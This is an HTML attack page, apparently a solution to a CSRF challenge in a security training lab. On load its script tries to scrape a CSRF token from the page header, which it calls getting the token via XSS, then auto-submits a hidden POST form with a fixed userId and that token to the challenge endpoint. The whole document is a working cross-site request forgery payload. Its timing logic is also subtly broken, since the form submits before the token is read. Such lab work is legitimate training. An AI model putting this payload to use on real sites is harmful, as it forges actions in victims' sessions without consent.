<!doctype HTML>
<html>
    <head>
        <title>Crazydais - CSRF</title>
    </head>

    <body>
        <h1>Crazydais - CSR</h1>

        <script>
            (function () {
                
                var csrf = 'a1b2';
                setTimeout(function(){
                    try {
                        var header = document.getElementById("header").getElementsByTagName("a")[0];
                        var href = header.getAttribute("href");
                        csrf = href.split("=")[1];
                    }
                    catch(e) {
                        console.log("couldn't get the CSRF token using XSS!");
                    }
                }, 3);

                createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
            })();
            
            function addInputToForm(form, name, value) {
                // Create a hidden input element, and append it to the form
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            function createForm(id, csrf) {
                var form = document.createElement('form');
                form.action = 'https://shepherd.waratek.lan/user/csrfchallengethree/plusplus';
                form.method = 'POST';
                addInputToForm(form, 'userId', id);
                addInputToForm(form, 'csrfToken', csrf);
                form.submit();
            }
        </script>
    </body>
</html>
